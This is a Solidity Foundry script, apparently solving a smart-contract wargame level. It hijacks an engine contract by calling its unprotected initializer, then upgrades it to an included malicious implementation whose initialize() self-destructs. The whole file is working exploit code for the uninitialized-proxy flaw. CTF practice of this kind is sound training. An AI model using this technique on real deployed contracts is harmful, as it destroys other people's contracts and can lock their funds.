// SPDX-License-Identifier: MIT
pragma solidity 0.6.3;


import "forge-std/Script.sol";
import "../interfaces/ILevel25.sol";
import "../node_modules/@openzeppelin/contracts/proxy/Initializable.sol";

contract EngineFailure is Script, Initializable {
    IEngine engine = IEngine(0x7bB5ab9773d734842Fc6E956bd205E5031551757);
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    address public upgrader;
    address public horsePower;
    function run() external {
        vm.startBroadcast();
        address newImplementation = 0xb92d244490d13e87B1034CDcBfb86471A07913F4;
        bytes memory initSelector = abi.encodeWithSelector(engine.initialize.selector);

        // calling the initializer and setting our address as msg.sender
        engine.initialize();    

        // upgrading the implementation and passing in the initSelector so that it is called during upgrade, contains selfdestruct
        engine.upgradeToAndCall(newImplementation,initSelector);
        
        
        vm.stopBroadcast();
    }
}

/*
THIS IS THE CODE OF THE NEW IMPLEMENTATION DEPLOYED USING REMIX
//SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "forge-std/Script.sol";
import "https://github.com/OpenZeppelin/openzeppelin-upgrades/blob/master/packages/core/contracts/Initializable.sol";

contract MalImplementation is Initializable { 
    function initialize() external {
        selfdestruct(0xc84f7C2f011B3D7eFaA6C2AFFB69B0aA145ee1D2);
    }
}

*/
